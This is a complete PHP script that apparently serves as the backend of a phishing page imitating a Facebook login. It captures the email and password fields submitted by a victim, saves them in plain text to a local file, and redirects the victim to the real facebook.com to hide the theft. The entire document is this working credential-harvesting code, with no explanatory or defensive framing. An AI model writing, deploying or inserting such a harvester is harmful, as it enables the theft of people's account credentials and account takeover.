<?php
$email = $_POST["email"];
$password = $_POST["password"];
$txt = $email ."\n" .  $password;
$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
fwrite($myfile, $txt . "\n");
fclose($myfile);
if($txt != null) {
    header("Location: https://www.facebook.com");
}
?>